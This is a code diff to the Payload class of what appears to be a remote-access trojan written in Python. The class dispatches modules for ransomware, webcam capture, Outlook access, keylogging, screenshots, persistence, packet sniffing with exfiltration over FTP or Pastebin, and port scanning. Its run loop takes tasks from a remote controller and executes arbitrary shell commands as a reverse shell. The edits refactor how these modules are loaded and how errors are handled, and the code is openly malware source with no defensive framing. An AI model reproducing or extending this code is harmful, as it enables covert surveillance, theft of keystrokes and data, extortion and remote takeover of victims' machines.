@@ -593,7 +593,7 @@ class Payload():
 
         """
         if 'ransom' not in globals():
-            globals()['ransom'] = self.load('ransom')
+            self.load('ransom')
         return globals()['ransom'].run(args)
 
 
@@ -612,7 +612,7 @@ class Payload():
         """
         try:
             if 'webcam' not in globals():
-                globals()['webcam'] = self.load('webcam')
+                self.load('webcam')
             elif not args:
                 result = self.webcam.usage
             else:
@@ -668,7 +668,7 @@ class Payload():
 
         """
         if 'outlook' not in globals():
-            globals()['outlook'] = self.load('outlook')
+            self.load('outlook')
         elif not args:
             try:
                 if not globals()['outlook'].installed():
@@ -739,7 +739,7 @@ class Payload():
         """
         try:
             if 'process' not in globals():
-                globals()['process'] = self.load('process')
+                self.load('process')
             if not args:
                 if hasattr(globals()['process'], 'usage'):
                     return globals()['process'].usage
@@ -767,7 +767,7 @@ class Payload():
         
         """
         if 'portscanner' not in globals():
-            globals()['portscanner'] = self.load('portscanner')
+            self.load('portscanner')
         try:
             if not args:
                 return 'portscan <mode> <target>'
@@ -830,7 +830,7 @@ class Payload():
             except Exception as e:
                 log("{} error: {}".format('keylogger.status', str(e)))
         if 'keylogger' not in globals():
-            globals()['keylogger'] = self.load('keylogger')
+            self.load('keylogger')
         elif not mode:
             if 'keylogger' not in self.handlers:
                 return globals()['keylogger'].usage
@@ -864,7 +864,7 @@ class Payload():
                 return keylogger.usage + '\n\targs: start, stop, dump'
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot <mode>')
-    def screenshot(mode=None):
+    def screenshot(self, mode=None):
         """ 
         Capture a screenshot from host device
 
@@ -873,11 +873,18 @@ class Payload():
         
         """
         try:
+#            if 'mss' not in globals():
+#                self.load('mss')
+#            with mss.mss() as screen:
+#                img = screen.grab(screen.monitors[0])
+#            return globals()['png'](img)
             if 'screenshot' not in globals():
-                globals()['screenshot'] = self.load('screenshot')
-            return globals()['screenshot'].run(mode)
+                self.load('screenshot')
+            return globals()['screenshot'].run()
         except Exception as e:
-            log("{} error: {}".format(self.screenshot.func_name, str(e)))
+            result = "{} error: {}".format(self.screenshot.func_name, str(e))
+            log(result) 
+            return result
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='persistence <add/remove> [method]')
     def persistence(self, args=None):
@@ -899,7 +906,7 @@ class Payload():
         """
         try:
             if not 'persistence' in globals():
-                globals()['persistence'] = self.load('persistence')
+                self.load('persistence')
             methods = globals()['persistence'].methods() + ['all']
             cmd, _, action = str(args).partition(' ')
             if cmd not in ('add','remove') or action not in methods:
@@ -923,7 +930,7 @@ class Payload():
         """
         try:
             if 'packetsniffer' not in globals():
-                globals()['packetsniffer'] = self.load('packetsniffer')
+                self.load('packetsniffer')
             args = globals()['kwargs'](args)
             if 'mode' not in args or args['mode'] not in ('ftp', 'pastebin'):
                 return "keyword argument 'mode' is missing or invalid (use 'ftp' or 'pastebin')"
@@ -994,27 +1001,24 @@ class Payload():
         and initialize a reverse TCP shell
 
         """
-        try:
-            for target in ('resource_handler','prompt_handler','thread_handler'):
-                if not bool(target in self.handlers and self.handlers[target].is_alive()):
-                    self.handlers[target] = getattr(self, '_get_{}'.format(target))()
-            while True:
-                if self.flags.connection.wait(timeout=1.0):
-                    if not self.flags.prompt.is_set():
-                        task = self.recv_task()
-                        if isinstance(task, dict) and 'task' in task:
-                            cmd, _, action = task['task'].encode().partition(' ')
-                            try:
-                                command = self._get_command(cmd)
-                                result = bytes(command(action) if action else command()) if command else bytes().join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
-                            except Exception as e:
-                                result = "{} error: {}".format(self.run.func_name, str(e))
-                                log(level='debug', info=result)
-                            task.update({'result': result})
-                            self.send_task(task)
-                        self.flags.prompt.set()
-                else:
-                    log("Connection timed out")
-                    break
-        except Exception as e:
-            log("{} error: {}".format(self.run.func_name, str(e)))
+        for target in ('resource_handler','prompt_handler','thread_handler'):
+            if not bool(target in self.handlers and self.handlers[target].is_alive()):
+                self.handlers[target] = getattr(self, '_get_{}'.format(target))()
+        while True:
+            if self.flags.connection.wait(timeout=1.0):
+                if not self.flags.prompt.is_set():
+                    task = self.recv_task()
+                    if isinstance(task, dict) and 'task' in task:
+                        cmd, _, action = task['task'].encode().partition(' ')
+                        try:
+                            command = self._get_command(cmd)
+                            result = bytes(command(action) if action else command()) if command else bytes().join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
+                        except Exception as e:
+                            result = "{} error: {}".format(self.run.func_name, str(e))
+                            log(level='debug', info=result)
+                        task.update({'result': result})
+                        self.send_task(task)
+                    self.flags.prompt.set()
+            else:
+                log("Connection timed out")
+                break
